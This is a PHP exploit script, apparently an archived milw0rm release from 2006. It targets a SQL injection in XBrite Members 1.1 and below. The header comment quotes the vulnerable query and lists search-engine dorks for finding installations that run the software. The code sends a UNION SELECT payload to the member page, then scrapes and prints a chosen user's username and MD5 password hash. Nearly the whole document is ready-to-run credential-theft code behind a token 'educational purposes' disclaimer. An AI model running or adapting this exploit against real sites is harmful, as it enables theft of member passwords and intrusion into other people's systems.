<?php /*
 |=================================================================================================|
 |       _______..__   __.      ___      .___________.  ______  __    __   _______ .______         |
 |      /       ||  \ |  |     /   \     |           | /      ||  |  |  | |   ____||   _  \        |
 |     |   (----`|   \|  |    /  ^  \    `---|  |----`|  ,----'|  |__|  | |  |__   |  |_)  |       |
 |      \   \    |  . `  |   /  /_\  \       |  |     |  |     |   __   | |   __|  |      /        |
 |  .----)   |   |  |\   |  /  _____  \      |  |     |  `----.|  |  |  | |  |____ |  |\  \----.   |
 |  |_______/    |__| \__| /__/     \__\     |__|      \______||__|  |__| |_______|| _| `._____|   |
 |                                                                                                 |
 |=================================================================================================|


      exploit: XBrite Members <= 1.1 remote sql injection vulnerability
      release: 2006-04-09
       author: snatcher [snatcher at gmx.ch]
      country: switzerland  |+|
	  
  application: XBrite Members <= 1.1
  description: a php / mysql based member script
     download: http://www.xelebrite.de
	           http://www.clanscripte.net/main.php?content=download&do=file&dlid=179
  description: if magic_quotes_gpc is Off, you can get each password (md5 hash) with a simple sql injection
  fingerprint: google -> "Powered By XBrite Members" -> 2800
               msn -> "Powered By XBrite Members" ->  581
   conditions: php.ini -> magic_quotes_gpc = Off
       greets: all security guys and coders over the world, honkey :>, ..
 terms of use: this exploit is just for educational purposes, do not use it for illegal acts.


---------------------------- members.php - line 197 -------------------------------------
$query = @mysql_query ("select * from oz_members where id='".$_GET['id']."'");
-----------------------------------------------------------------------------------------

because magic_quotes_gpc is off, you can break out of the singel quotes and insert malicious sql code,
i.e. with a union operator.


*/

/*********************** CONFIGURATION ****************************/

$PATH_TO_FILE  = 'http://yourhost.com/member.php';                 // in example: http://yourhost.com/member.php
$USER_ID       = 1;                                                // from which user id do you want the password? default: 1
$GET_VARS      = '?action=members&act=show&id=';                   // do not change
$SQL_INJECTION = '0\' union select 1,1,1,1,1,1,1,1,1,real_name'.   // do not change
                 ',name,pw,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,'.
				 '1,1,1,1,1,1,1,1,1,1,1,1 from oz_members where '.
				 'id = '.$USER_ID.' /*';


/**************************** MAIN ********************************/

$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\'t open host!'); 
foreach ($file_array as $now)                               
	$html_content .= $now;

$html_content = str_castrate($html_content);

preg_match_all("!Alter:</b></td><tdwidth=\"50%\">(.*?)</td>!",$html_content,$username); /* gets username */
preg_match_all("!Herkunft:</b></td><tdwidth=\"50%\">(.*?)</td>!",$html_content,$password); /* gets password */

if ($username[1][0] && $password[1][0] && $username[1][0] <> 'keineAngabe') {
	echo 'username: <b>'.$username[1][0].'</b><br>';
	echo 'password: <b>'.$password[1][0].'</b>';
}else {
	echo 'exploit failed! <br>magic_quotes_gpc = Off ?';
}
echo '<br><br><br><br><br>
======================================================================<br>
exploit: XBrite Members <= 1.1 remote sql injection vulnerability<br>
release: 2006-04-09<br>
author: snatcher [snatcher at gmx.ch]<br>
======================================================================';

function str_castrate($string) {
	$string = str_replace("\n", '', $string);
	$string = str_replace("\r", '', $string);
	$string = str_replace(" ", '', $string);
	return $string;
}
?>

# milw0rm.com [2006-04-09]
